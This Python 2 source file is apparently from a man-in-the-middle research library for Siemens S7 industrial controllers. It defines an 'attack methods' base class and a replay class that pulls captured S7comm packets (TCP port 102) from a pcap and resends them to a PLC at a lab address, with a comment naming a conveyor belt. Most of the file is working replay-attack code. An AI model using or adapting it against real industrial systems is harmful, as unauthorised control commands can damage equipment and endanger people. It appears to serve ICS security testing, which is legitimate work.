from MITM_Lib.Client import *

#Child class of Client
#Parent class for all attack methods
class Step7_Master(Client):
    def __init__(self, node, port, timeout_time=2*60):
        Client.__init__(self, node, port, timeout_time=timeout_time)

    #Extract the raw (PDU) data, determine response and add to the outgoing packets
    def process_response(self, response):
        #print response
        # Process response using Snap 7 lib
        condition = False       #Change this based on processing code
        if condition:
            self.queue_out.put("data")

    #Process the incoming packets
    def process_in(self):
        print "- Running in Process..."
        while self.running:
            if not self.queue_in.empty():
                try:
                    data = self.queue_in.get()
                    self.process_response(data)
                except:
                    raise
            else:
                pass
        print "- Quiting in Process..."

    #Process the outgoing packets
    def process_out(self):
        print "- Running out Process..."
        while self.running:
            if not self.queue_out.empty():
                step7 = self.queue_out.get()
                # print step7.summary()
                self.send(step7)
                #print("Packet Sent")
            else:
                pass
        print "- Quiting out Process..."

    def automation(self):
        sleep(20)
        if self.running:
            self.stop()

    def start(self):
        automation = Thread(target=self.automation)
        automation.daemon = True
        automation.start()
        super(Step7_Master, self).start()
        automation.join()
        self.socket.close()
        #self.queue_out = None
        return


class Step7_Master_Replay(Step7_Master):
    def __init__(self, node, port, pcap=None, timeout_time=2 * 60):
        Step7_Master.__init__(self, node, port, timeout_time=timeout_time)
        #self.s7_client.connect("10.10.10.13",0,1)               #Connect to conveyor belt
        #self.s7_client.connect("10.10.10.10",0,1)
        if pcap is not None:
            self.pcap = rdpcap(pcap)
        self.replay_messages = list()

    def filter_pcap(self):
        for p in self.pcap:
            # filter conditions
            if p.haslayer(TCP) and p.haslayer(Raw):
                if p[TCP].dport == 102 and p[IP].dst == "10.10.10.10":
                #if p[TCP].dport == 102 and p[IP].dst == "10.10.10.13":
                    self.replay_messages.append(p)
            #pass

    def replay(self):
        print len(self.replay_messages), "Replayable Packets"
        replay_count = 0
        wait_time = self.replay_messages[0].time
        while self.running and replay_count < len(self.replay_messages):
            m = self.replay_messages[replay_count]
            sleep_time = m.time - wait_time
            #print sleep_time
            time.sleep(sleep_time)
            raw = m.getlayer(Raw).load
            self.queue_out.put(raw)
            wait_time = m.time
            replay_count += 1
        sleep(5)
        print "End Replay"

    def automation(self):
        self.filter_pcap()
        while not self.running:
            pass

        if self.running:
            self.replay()
        self.stop()
        print "Quitting automation"